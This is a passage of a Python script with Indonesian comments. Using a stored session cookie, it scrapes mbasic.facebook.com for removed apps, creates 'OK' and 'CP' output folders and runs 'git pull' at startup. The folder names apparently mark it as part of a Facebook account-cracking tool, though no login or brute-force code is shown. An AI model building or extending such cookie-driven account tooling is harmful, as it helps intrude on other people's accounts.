                 get_inactive(next,cookie) 
         except:pass 
  
 #--[ cek apk dihapus ]--#                 
 def get_remove(url,cookie): 
         try: 
                 data = parser(ses.get(url,cookies=cookie).content,"html.parser") 
                 for apk in data.find_all('h3'): 
                         if 'Dihapus' in apk.text: 
                                 apk3.append(f"{str(apk.text).replace('Deleted',' Deleted')}") 
                         else:continue 
                 next = "https://mbasic.facebook.com" + data.find('a',string='See More.')['href'] 
                 get_remove(next,cookie) 
         except:pass 
          
 def make(): 
         try:os.mkdir('OK') 
         except:pass 
         try:os.mkdir('CP') 
         except:pass 
         try:os.system('git pull') 
         except:pass 
         clear_layar() 
         back() 
          
          
 if __name__=='__main__': 
         make()        